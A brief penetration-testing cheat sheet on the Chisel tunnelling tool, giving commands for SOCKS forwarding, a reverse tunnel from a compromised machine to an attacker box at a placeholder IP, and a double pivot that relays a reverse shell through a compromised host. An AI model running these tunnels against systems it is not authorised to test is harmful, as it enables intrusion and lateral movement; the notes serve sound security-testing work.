# Chisel

TCP/UDP tunnel over HTTP (can be secured via SSH).

## Dynamic Port Forwarding

**Compromised Machine (Forward one port to the attacker's machine):**

```
.\chisel.exe server --socks5 --port 51234
```

**Attacker box:**

```
chisel client target-box-ip:51234 50080:socks
```

Proxychains config:

```
[ProxyList]
socks5 127.0.0.1 50080
```

***

## Reverse Tunnel

**Attacker box:**

```
chisel server --reverse --port 8081
```

**Compromised Machine:**

```
./chisel client <ATTACK_BOX_IP>:8081 R:socks
```

* `R:` means reverse (client initiates, server-side listens)
* `socks` creates a SOCKS5 proxy — default port 1080 on your attack box

### Double Pivot&#x20;

Reach a DMZ host from the attacker machine through a compromised host.

**Attacker Machine**

```bash
chisel server --reverse --port 8081
```

**Compromised Machine - acts as a pivot point**

<pre class="language-bash"><code class="lang-bash"><strong># Inbound traffic on compromised host 4444 port is forwarded to the attacker's 4444
</strong><strong># A reverse shell targeting the compromised host's 4444 will reach the attacker's 4444
</strong><strong>chisel client $attacker-ip:8081 R:4444:127.0.0.1:4444
</strong></code></pre>
